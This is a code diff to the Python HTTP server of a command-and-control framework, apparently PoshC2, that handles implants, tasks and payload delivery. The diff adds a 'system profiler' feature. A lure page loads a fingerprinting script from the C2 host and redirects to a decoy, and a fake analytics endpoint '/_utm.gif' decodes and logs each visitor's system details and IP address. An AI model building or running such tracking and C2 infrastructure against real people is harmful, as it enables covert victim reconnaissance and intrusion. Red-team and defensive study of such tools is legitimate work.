@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import argparse, os, sys, re, datetime, time, base64, BaseHTTPServer, re, logging, ssl, signal, ssl
+import argparse, os, sys, re, datetime, time, base64, BaseHTTPServer, re, logging, ssl, signal, ssl, urlparse
 
 from Implant import Implant 
 from Tasks import newTask
@@ -9,7 +9,7 @@ from Colours import Colours
 from DB import select_item, get_implants_all, update_implant_lastseen, update_task, get_cmd_from_task_id, get_c2server_all
 from DB import update_item, get_task_owner, get_newimplanturl, initializedb, setupserver, new_urldetails, get_baseenckey
 from Payloads import Payloads
-from Config import ROOTDIR, ServerHeader, PayloadsDirectory, HTTPResponse, DownloadsDirectory, Database, HostnameIP
+from Config import ROOTDIR, POSHDIR, ServerHeader, PayloadsDirectory, HTTPResponse, DownloadsDirectory, Database, HostnameIP, SYSTEM_PROFILER, SYSTEM_PROFILER_REDIRECT
 from Config import QuickCommand, KillDate, DefaultSleep, DomainFrontHeader, ServerPort, urlConfig, HOST_NAME, PORT_NUMBER
 from Config import DownloadURI, Sounds, APIKEY, MobileNumber, URLS, SocksURLS, Insecure, UserAgent, Referrer, APIToken
 from Config import APIUser, EnableNotifications
@@ -61,6 +61,36 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.send_header("Content-type", "text/html")
           s.end_headers()
           s.wfile.write(new_task)
+
+        elif ("/_utm.gif") in s.path:
+          logs = ""
+          ip_address = ["From: %s" % s.address_string()]          
+          profiler = base64.b64decode(urlparse.parse_qs(s.path)['/_utm.gif?utmje'][0]).split("|") + ip_address
+          logs += "%s visit from: %s" %(s.log_date_time_string(), profiler[0]) + "\n"
+        
+          for profile in profiler[1::]:
+            logs += "\t%s\n" % profile          
+          logs += "\n"
+          
+          open("%ssystem_profiler.log" % ROOTDIR, "a").write(logs)
+          s.send_response(200)
+          s.end_headers()
+          s.wfile.write("")
+
+        elif ("%s_js" % QuickCommandURI) in s.path:
+          filename = "%sFiles/fingerprint.js" % POSHDIR
+          with open(filename, 'rb') as f:
+            content = f.read()
+          s.send_response(200)         
+          s.end_headers()
+          s.wfile.write(content)
+
+        elif (SYSTEM_PROFILER) in s.path:
+          content = """<!DOCTYPE html><html><head><title></title></head><body><noscript>Please enable javascript!</noscript><script type="text/javascript" src="%s/%s_js"></script></body></html>""" % (HostnameIP, QuickCommandURI)
+          s.send_response(200)
+          s.send_header("Refresh","0.3;%s" % SYSTEM_PROFILER_REDIRECT)
+          s.end_headers()
+          s.wfile.write(content)
 
         elif ("%s_bs" % QuickCommandURI) in s.path:
           filename = "%spayload.bat" % (PayloadsDirectory)
@@ -460,6 +490,10 @@ if __name__ == '__main__':
       newPayload.WriteQuickstart(directory + '/quickstart.txt')
 
     print ("")
+
+    print("SYSTEM PROFILER URL: "+ HostnameIP + SYSTEM_PROFILER)
+    print("SYSTEM PROFILER Log: %ssystem_profiler.log\n" % ROOTDIR)
+       
     print ("CONNECT URL: "+select_item("HostnameIP", "C2Server")+get_newimplanturl() + Colours.GREEN)
     print ("WEBSERVER Log: %swebserver.log" % ROOTDIR)
     KEY = get_baseenckey()
